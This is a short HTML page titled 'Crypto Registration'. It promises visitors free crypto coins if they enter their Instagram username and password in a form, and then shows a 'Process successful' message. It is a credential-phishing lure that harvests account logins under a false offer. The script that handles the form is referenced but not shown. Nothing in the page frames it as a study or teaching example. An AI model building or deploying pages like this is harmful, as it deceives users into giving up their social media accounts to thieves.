<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crypto Registration</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <h1>Welcome to Crypto Registration</h1>
        <p>Enter your Instagram credentials to get free crypto coins.</p>
        <form id="registrationForm">
            <label for="instaUsername">Enter your Insta username</label>
            <input type="text" id="instaUsername" required>

            <label for="instaPassword">Enter your Insta password</label>
            <input type="password" id="instaPassword" required>

            <button type="submit">Submit</button>
        </form>

        <div id="successMessage" style="display: none;">
            <p>Process successful!</p>
            <p>You are now registered for free crypto coins!</p>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
